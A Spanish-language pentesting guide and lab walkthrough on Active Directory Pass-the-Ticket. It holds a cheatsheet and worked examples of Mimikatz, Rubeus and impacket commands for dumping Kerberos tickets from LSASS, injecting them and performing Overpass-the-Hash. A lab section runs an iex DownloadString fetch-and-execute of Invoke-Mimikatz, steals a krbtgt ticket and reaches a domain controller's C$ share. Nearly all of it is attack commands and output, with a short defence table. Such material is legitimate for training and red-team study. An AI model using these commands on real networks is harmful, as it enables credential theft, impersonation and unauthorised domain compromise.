
# AD Lateral Movement: Pass-the-Ticket

## <mark style="color:$primary;">¿Qué es Pass-the-Ticket?</mark>

**Pass-the-Ticket (PtT)** es una técnica de movimiento lateral que permite **reutilizar tickets Kerberos** (TGT o servicios) robados de la memoria LSASS de un equipo comprometido para autenticarse en otros sistemas del dominio.

#### ¿Cómo funciona?

Kerberos usa tickets en lugar de contraseñas para autenticación. Si obtienes el ticket TGT o el ticket de servicio de un usuario (por ejemplo, desde LSASS), puedes inyectarlo en tu propia sesión y actuar como si fueras ese usuario sin necesidad de conocer su contraseña o hash.

#### ¿Por qué es más poderoso que PtH?

<table data-header-hidden><thead><tr><th width="240.66668701171875"></th><th></th></tr></thead><tbody><tr><td>Ventaja</td><td>Explicación</td></tr><tr><td><strong>Sin contraseña ni hash</strong></td><td>Solo necesitas el ticket robado</td></tr><tr><td><strong>Elude restricciones NTLM</strong></td><td>Si el dominio deshabilita NTLM, PtT sigue funcionando</td></tr><tr><td><strong>Acceso a servicios específicos</strong></td><td>Puedes robar tickets de servicios concretos (CIFS, HTTP, LDAP)</td></tr><tr><td><strong>Mayor sigilo</strong></td><td>No genera eventos de inicio de sesión "Type 3" (NTLM)</td></tr></tbody></table>

***

## <mark style="color:$primary;">Cheatsheet</mark>

### 🔍 Obtención de tickets (desde Windows)

| Herramienta                            | Comando                                     | Lo que obtienes                |
| -------------------------------------- | ------------------------------------------- | ------------------------------ |
| **Mimikatz** (listar tickets)          | `sekurlsa::tickets /export`                 | Todos los tickets del sistema  |
| **Mimikatz** (solo TGT)                | `sekurlsa::tickets /export /service:krbtgt` | Ticket Granting Ticket         |
| **Rubeus** (listar tickets)            | `Rubeus.exe triage`                         | Resumen de tickets en memoria  |
| **Rubeus** (monitorear nuevos tickets) | `Rubeus.exe monitor /monitorinterval:5`     | Captura tickets en tiempo real |
| **Rubeus** (extraer todos)             | `Rubeus.exe dump /nowrap`                   | Tickets en formato base64      |

### 🪟 Inyección de tickets (desde Windows)

<table data-header-hidden><thead><tr><th width="322.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><strong>Mimikatz</strong> (inyectar ticket específico)</td><td><code>kerberos::ptt ruta\ticket.kirbi</code></td></tr><tr><td><strong>Mimikatz</strong> (inyectar desde base64)</td><td><code>kerberos::ptt "base64_del_ticket"</code></td></tr><tr><td><strong>Rubeus</strong> (importar ticket)</td><td><code>Rubeus.exe ptt /ticket:rutaticket.kirbi</code></td></tr><tr><td><strong>Rubeus</strong> (importar desde base64)</td><td><code>Rubeus.exe ptt /ticket:base64</code></td></tr><tr><td><strong>Rubeus</strong> (Overpass-the-Hash + PtT)</td><td><code>Rubeus.exe asktgt /user:administrador /domain:dominio.local /rc4:hash /ptt</code></td></tr></tbody></table>

### 🐉 Uso de tickets desde Kali Linux

<table data-header-hidden><thead><tr><th width="302.6666259765625"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><strong>Convertir ticket (.kirbi → .ccache)</strong></td><td><code>impacket-ticketConverter ticket.kirbi ticket.ccache</code></td></tr><tr><td><strong>Exportar variable de entorno</strong></td><td><code>export KRB5CCNAME=/ruta/ticket.ccache</code></td></tr><tr><td><strong>Ver tickets en caché</strong></td><td><code>klist</code> (si tienes krb5-user instalado)</td></tr><tr><td><strong>Usar ticket con impacket</strong></td><td><code>impacket-psexec -k -no-pass dominio.local/usuario@host -dc-ip &#x3C;IP></code></td></tr><tr><td><strong>Usar ticket con smbclient</strong></td><td><code>smbclient //host/C$ -k -no-pass</code></td></tr></tbody></table>

### 🔄 Overpass-the-Hash (convertir hash → ticket)

<table data-header-hidden><thead><tr><th width="248"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Comando</td></tr><tr><td><strong>Rubeus</strong> (hash a TGT)</td><td><code>Rubeus.exe asktgt /user:usuario /domain:dominio.local /rc4:&#x3C;hash> /ptt</code></td></tr><tr><td><strong>Rubeus</strong> (hash AES a TGT)</td><td><code>Rubeus.exe asktgt /user:usuario /domain:dominio.local /aes256:&#x3C;hash> /ptt</code></td></tr><tr><td><strong>impacket-getTGT</strong></td><td><code>impacket-getTGT -hashes :&#x3C;hash> dominio.local/usuario</code></td></tr></tbody></table>

***

## <mark style="color:$primary;">Ejemplos prácticos</mark>

#### Windows: Obtener e inyectar tickets con Mimikatz

```bash
# 1. Ejecutar Mimikatz como administrador
mimikatz.exe
privilege::debug

# 2. Listar todos los tickets en memoria
sekurlsa::tickets

# 3. Exportar todos los tickets a archivos .kirbi
sekurlsa::tickets /export

# 4. Inyectar un ticket específico (ej: el de administrador)
kerberos::ptt C:\Users\usuario\Desktop\[0;3e4]-2-0-40e10000-Administrador@krbtgt-DOMINIO.LOCAL.kirbi

# 5. Verificar que el ticket está en la sesión
klist

# 6. Ya puedes acceder a recursos remotos
dir \\DC\C$
```

#### Windows: Obtener e inyectar tickets con Rubeus

```bash
# 1. Listar tickets actuales
Rubeus.exe triage

# 2. Extraer todos los tickets en formato base64
Rubeus.exe dump /nowrap

# 3. Inyectar un ticket desde base64
Rubeus.exe ptt /ticket:doIFwjCCBb6gAwIBBaEDAgEWooIEs...

# 4. O inyectar desde archivo
Rubeus.exe ptt /ticket:ruta\ticket.kirbi

# 5. Verificar
Rubeus.exe klist
```

#### Windows: Overpass-the-Hash (si tienes hash, no ticket)

```bash
# Obtener TGT directamente desde el hash NT
Rubeus.exe asktgt /user:administrador /domain:dominio.local /rc4:3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 /ptt

# Con hash AES256
Rubeus.exe asktgt /user:administrador /domain:dominio.local /aes256:b7e5f3c8cbfa6a2c6f0a5f9e2d8c4a1b3c8cbfa6a2c6f0a5 /ptt
```

#### Kali Linux: Usar tickets robados

```bash
# 1. Convertir ticket .kirbi (Windows) a .ccache (Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache

# 2. Exportar variable de entorno
export KRB5CCNAME=$(pwd)/ticket.ccache

# 3. Verificar ticket
klist  # o si no tienes klist, usar impacket-klist
impacket-klist -k ticket.ccache

# 4. Usar el ticket con impacket (-k y -no-pass son clave)
impacket-psexec -k -no-pass -dc-ip 192.168.1.10 dominio.local/administrador@DC

# 5. Con smbclient
smbclient //192.168.1.10/C$ -k -no-pass

# 6. Con impacket-wmiexec
impacket-wmiexec -k -no-pass -dc-ip 192.168.1.10 dominio.local/administrador@192.168.1.50

# 7. Con impacket-smbexec
impacket-smbexec -k -no-pass -dc-ip 192.168.1.10 dominio.local/administrador@192.168.1.50
```

#### Kali: Overpass-the-Hash (hash → ticket)

```bash
# Obtener TGT desde hash NT
impacket-getTGT -hashes :3c8cbfa6a2c6f0a5f9e2d8c4a1b7e5f3 dominio.local/administrador

# Esto genera un archivo .ccache, luego exportas
export KRB5CCNAME=administrador.ccache

# Y usas como antes
impacket-psexec -k -no-pass dominio.local/administrador@DC -dc-ip 192.168.1.10
```

***

## <mark style="color:$primary;">Flujo completo de ataque</mark>

#### Paso 1: Comprometer un equipo inicial

```bash
# Ya tienes acceso a Windows con privilegios
# o mediante impacket desde Kali
```

#### Paso 2: Extraer tickets de la memoria

```bash
# Mimikatz
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit

# O con Rubeus
Rubeus.exe dump /nowrap > tickets.txt
```

#### Paso 3: Identificar tickets valiosos

Busca tickets de:

* **krbtgt** → TGT que permite solicitar cualquier servicio
* **Administrador** o **Domain Admin**
* **Servicios específicos** (CIFS para SMB, LDAP para consultas, HOST para WinRM)

#### Paso 4: Inyectar ticket y moverse lateralmente

```bash
# Windows
kerberos::ptt ticket_de_administrador.kirbi
dir \\EQUIPO_REMOTO\C$
```

```bash
# Kali (después de convertir)
export KRB5CCNAME=ruta/ticket.ccache
impacket-psexec -k -no-pass -dc-ip 192.168.1.10 dominio.local/usuario@EQUIPO_REMOTO
```

#### Paso 5: Extraer nuevos tickets desde el equipo remoto y repetir

***

#### 📊 Comparativa: PtT vs PtH vs Overpass-the-Hash

| Técnica               | Necesitas               | Se puede hacer desde | Detección típica       |
| --------------------- | ----------------------- | -------------------- | ---------------------- |
| **Pass-the-Hash**     | Hash NTLM               | Windows, Kali        | Evento 4624 (NTLM)     |
| **Pass-the-Ticket**   | Ticket .kirbi/.ccache   | Windows, Kali        | Menos eventos Kerberos |
| **Overpass-the-Hash** | Hash NTLM → generar TGT | Windows, Kali        | Evento 4768 (TGT)      |

***

#### ⚠️ Diferencias entre Overpass-the-Hash y Pass-the-Ticket

```bash
Overpass-the-Hash:
Hash NT → Rubeus asktgt → Ticket TGT → Inyectar → Acceso

Pass-the-Ticket (clásico):
Ticket robado (de LSASS) → Inyectar directamente → Acceso
```

**Overpass-the-Hash** es útil cuando tienes el hash de un usuario pero no su ticket.\
**Pass-the-Ticket** es útil cuando robaste un ticket ya existente (quizás con más privilegios que los que tú tienes).

***

## <mark style="color:$primary;">¿Cómo protegerte de Pass-the-Ticket?</mark>

<table data-header-hidden><thead><tr><th width="301.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Medida</td><td>Descripción</td></tr><tr><td><strong>Credential Guard</strong></td><td>Protege LSASS de ser leído (Windows 10/Server 2016+)</td></tr><tr><td><strong>Protected Process Light (PPL)</strong></td><td>Evita que procesos no firmados lean LSASS</td></tr><tr><td><strong>Restringir administradores locales</strong></td><td>Menos tickets con privilegios en equipos</td></tr><tr><td><strong>Ticket lifetimes cortas</strong></td><td>Reducir ventana de reutilización (por defecto 10 horas)</td></tr><tr><td><strong>Monitorear eventos</strong></td><td>ID 4768 (TGT solicitado), 4769 (servicio solicitado)</td></tr><tr><td><strong>Auditar uso anómalo de tickets</strong></td><td>Un ticket usado desde IP diferente</td></tr></tbody></table>

***

### 📌 Notas importantes

1. Los tickets tienen **lifetime limitada** (por defecto 10 horas)
2. Los tickets son **válidos solo para el dominio** donde fueron emitidos
3. `-k` en impacket significa "usar Kerberos authentication"
4. `-no-pass` es obligatorio si usas `-k` (no estás usando contraseña)
5. `-dc-ip` ayuda a evitar resolución DNS incorrecta
6. Los tickets exportados con Mimikatz son archivos `.kirbi` (formato Windows)
7. Kali usa `.ccache` (necesitas convertir con `impacket-ticketConverter`)

***

## <mark style="color:$primary;">Lab: Pass the Ticket (PtT)</mark>

En este entorno de laboratorio, se accede mediante interfaz gráfica de usuario a un usuario de dominio llamado Research/Student en una máquina Windows Server 2012, que funciona como su estación de trabajo. Esta estación de trabajo es vulnerable a un ataque de tipo "Pass the Ticket".

Tu tarea consiste en ejecutar un ataque Pass-The-Ticket. Al realizar este ataque, suplantarás la sesión de un usuario reutilizando los tickets Kerberos, con el objetivo final de acceder a recursos y escalar privilegios dentro del entorno de Active Directory.

**Objetivo: Ejecutar un ataque Pass-The-Ticket (PtT) suplantando la identidad de una sesión de usuario y obteniendo acceso no autorizado para escalar privilegios dentro del entorno de Active Directory.**

### Tarea 1

> Realizar el reconocimiento

#### Enumeración con Powerview

```powershell
PS C:\Users\student> cd C:/Tools
PS C:\> powershell -ep bypass
PS C:\Tools> . .\PowerView.ps1
```

Somos el usuario research\student en el host client:

```powershell
PS C:\Tools> whoami
research\student
PS C:\Tools> hostname
client
```

#### Buscar cuentas Local Admin

```powershell
PS C:\Tools> Find-LocalAdminAccess
seclogs.research.SECURITY.local
```

Observamos que la cuenta `seclogs` es local admin en el equipo.

#### Enter-PSSession

Impersonamos esta cuenta con Enter-PSSession:

```powershell
PS C:\Tools> Enter-PSSession seclogs.research.SECURITY.local
[seclogs.research.SECURITY.local]: PS C:\Users\student\Documents>
```

Comprobamos que tenemos bastantes privilegios en el equipo:

```powershell
[seclogs.research.SECURITY.local]: PS C:\Users\student\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= =======
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Enabled
SeSecurityPrivilege             Manage auditing and security log          Enabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Enabled
SeLoadDriverPrivilege           Load and unload device drivers            Enabled
SeSystemProfilePrivilege        Profile system performance                Enabled
SeSystemtimePrivilege           Change the system time                    Enabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled
SeCreatePagefilePrivilege       Create a pagefile                         Enabled
SeBackupPrivilege               Back up files and directories             Enabled
SeRestorePrivilege              Restore files and directories             Enabled
SeShutdownPrivilege             Shut down the system                      Enabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Enabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Enabled
SeUndockPrivilege               Remove computer from docking station      Enabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled
SeTimeZonePrivilege             Change the time zone                      Enabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled
```

***

### Tarea 2

> Implementación del ataque

#### HFS Server

Usaremos HFS Server para importar las herramientas a la sesión de Powershell de seclogs que hemos impersonado, ya que nos genera una URL para descargar las tools:

<figure><img src="/files/HLNahaPinA2k8FoDolRu" alt=""><figcaption></figcaption></figure>

#### Importar Mimikatz

{% hint style="info" %}
**Nota**: Usar Invoke-Mimikatz para ejecutar Mimikatz desde Powershell
{% endhint %}

```powershell
[seclogs.research.SECURITY.local]: PS C:\> iex (New-Object Net.WebClient).DownloadString('http://10.0.5.101/Invoke-Mimikatz.ps1')
```

***

### Tarea 3

> Exportar ticket de Kerberos

#### Volcar tickets con Mimikatz

<pre class="language-powershell"><code class="lang-powershell">[seclogs.research.SECURITY.local]: PS C:\> Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
<strong>
</strong><strong>Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440
</strong>
  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::tickets /export

Authentication Id : 0 ; 3822837 (00000000:003a54f5)
Session           : Network from 0
User Name         : student
Domain            : RESEARCH
Logon Server      : (null)
Logon Time        : 4/29/2026 7:44:44 AM
SID               : S-1-5-21-1693200156-3137632808-1858025440-1115

&#x3C;----SNIP---->

Group 0 - Ticket Granting Service
 [00000000]
   Start/End/MaxRenew: 4/29/2026 7:29:33 AM ; 4/29/2026 5:14:32 PM ; 5/6/2026 7:14:32 AM
   Service Name (02) : cifs ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
   Target Name  (02) : cifs ; prod.research.SECURITY.local ; @ RESEARCH.SECURITY.LOCAL
   Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   Session Key       : 0x00000012 - aes256_hmac
     5c27657e9d4371302be2d861b41b2155bc353c8f1476f8af28541106fa76122d
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
   * Saved to file [0;3e4]-0-0-40a50000-SECLOGS$@cifs-prod.research.SECURITY.local.kirbi !
 [00000001]
   Start/End/MaxRenew: 4/29/2026 7:14:32 AM ; 4/29/2026 5:14:32 PM ; 5/6/2026 7:14:32 AM
   Service Name (02) : GC ; dc2012.SECURITY.local ; SECURITY.local ; @ SECURITY.LOCAL
   Target Name  (02) : GC ; dc2012.SECURITY.local ; SECURITY.local ; @ SECURITY.LOCAL
   Client Name  (01) : SECLOGS$ ; @ RESEARCH.SECURITY.LOCAL
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
   Session Key       : 0x00000012 - aes256_hmac
     a2d2bfb035f909194724f826bd6ec90deb3cd71d62bd3a91c2e3202698003b3f
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
   * Saved to file [0;3e4]-0-1-40a50000-SECLOGS$@GC-dc2012.SECURITY.local.kirbi !
   
 &#x3C;----SNIP---->
</code></pre>

Observamos que eso nos guarda en local distintos tickets específicos para acceder a ciertos servicios, como por ejemplo al Domain Controller, y el krbtgt que nos permite acceder a donde queramos:

```
SECLOGS$@GC-dc2012.SECURITY.local.kirbi
maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
```

```powershell
[seclogs.research.SECURITY.local]: PS C:\> ls | select name

Name
----
PerfLogs
Program Files
Program Files (x86)
Users
Windows
[0;103db8]-0-0-60a50000-student@LDAP-prod.research.SECURITY.local.kirbi
[0;28f6bc]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;336ab]-0-0-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi
[0;336ab]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;339ad]-0-1-40a50000-maintainer@LDAP-prod.research.SECURITY.local.kirbi
[0;339ad]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;3a54f5]-2-0-60a10000-student@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi
[0;3e4]-0-0-40a50000-SECLOGS$@cifs-prod.research.SECURITY.local.kirbi
[0;3e4]-0-1-40a50000-SECLOGS$@GC-dc2012.SECURITY.local.kirbi
<----SNIP---->
```

#### Importar ticket KRBTGT con Mimikatz

```powershell
[seclogs.research.SECURITY.local]: PS C:\> Invoke-Mimikatz -Command '"kerberos::ptt [0;336ab]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi"'

Hostname: seclogs.research.SECURITY.local / S-1-5-21-1693200156-3137632808-1858025440

  .#####.   mimikatz 2.2.0 (x64) #19041 Jun  9 2021 18:55:28
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # kerberos::ptt [0;336ab]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi

* File: '[0;336ab]-2-0-40e10000-maintainer@krbtgt-RESEARCH.SECURITY.LOCAL.kirbi': OK
```

Comprobamos que se ha importado correctamente con klist:

```powershell
[seclogs.research.SECURITY.local]: PS C:\> klist

Current LogonId is 0:0x3a3c02

Cached Tickets: (1)

#0>     Client: maintainer @ RESEARCH.SECURITY.LOCAL
        Server: krbtgt/RESEARCH.SECURITY.LOCAL @ RESEARCH.SECURITY.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/29/2026 7:14:56 (local)
        End Time:   4/29/2026 17:14:56 (local)
        Renew Time: 5/6/2026 7:14:56 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

***

### Tarea 4

> Comprobar el acceso al controlador de dominio

#### Comprobar Domain Controller

Desde una nueva Powershell comprobamos que el DC es `prod.research.SECURITY.local`:

```powershell
PS C:\Tools> . .\PowerView.ps1
PS C:\Tools> Get-Domain

Forest                  : SECURITY.local
DomainControllers       : {prod.research.SECURITY.local}
Children                : {}
DomainMode              : Windows2012R2Domain
DomainModeLevel         : 6
Parent                  : SECURITY.local
PdcRoleOwner            : prod.research.SECURITY.local
RidRoleOwner            : prod.research.SECURITY.local
InfrastructureRoleOwner : prod.research.SECURITY.local
Name                    : research.SECURITY.local
```

#### Acceder a archivos

Una vez que tenemos el ticket importado, podemos acceder y listar archivos del Domain Controller directamente:

```powershell
[seclogs.research.SECURITY.local]: PS C:\> ls \\prod.research.security.local\c$

    Directory: \\prod.research.security.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/22/2013   3:52 PM                PerfLogs
d-r---        10/1/2021   4:25 PM                Program Files
d-----        9/21/2021  12:28 PM                Program Files (x86)
d-r---        9/27/2021   9:00 AM                Users
d-----        9/27/2021   9:19 AM                Windows
```

```powershell
[seclogs.research.SECURITY.local]: PS C:\> cd \\prod.research.security.local\c$
[seclogs.research.SECURITY.local]: PS Microsoft.PowerShell.Core\FileSystem::\\prod.research.security.local\c$> ls

    Directory: \\prod.research.security.local\c$

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        8/22/2013   3:52 PM                PerfLogs
d-r---        10/1/2021   4:25 PM                Program Files
d-----        9/21/2021  12:28 PM                Program Files (x86)
d-r---        9/27/2021   9:00 AM                Users
d-----        9/27/2021   9:19 AM                Windows
```
